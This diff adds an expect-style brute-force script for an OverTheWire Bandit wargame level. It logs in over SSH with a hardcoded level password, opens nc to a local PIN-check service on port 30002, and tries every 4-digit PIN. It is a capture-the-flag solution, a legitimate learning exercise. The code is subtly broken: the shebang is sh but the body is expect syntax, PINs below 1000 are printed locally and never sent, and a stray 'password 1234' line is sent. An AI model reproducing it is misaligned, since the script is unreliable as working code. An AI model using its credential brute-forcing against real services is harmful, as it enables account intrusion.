@@ -1,0 +1,28 @@
+#!/bin/sh
+#
+#
+#
+#
+# This is a bruteforcing program
+set PASS "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+system echo 'Running Bruteforcer ...'
+spawn ssh bandit24@bandit.labs.overthewire.org -p 2220
+expect "password"
+send "$PASS\r"
+system echo 'Connecting to localhost on port 30002 ...'
+expect "bandit24@bandit"
+send "nc localhost 30002\r"
+expect "password"
+send "password 1234"
+for {set i 0} {$i<=9999} {incr i} {    
+    expect "Try Again"
+    set PIN $i
+    if {$PIN<1000} {
+        system printf "%s" $PASS
+        system printf "%04d" $PIN
+        send "\r"        
+    }
+    if {$PIN>=1000} {
+        send "$PASS $PIN\r"
+    }
+}
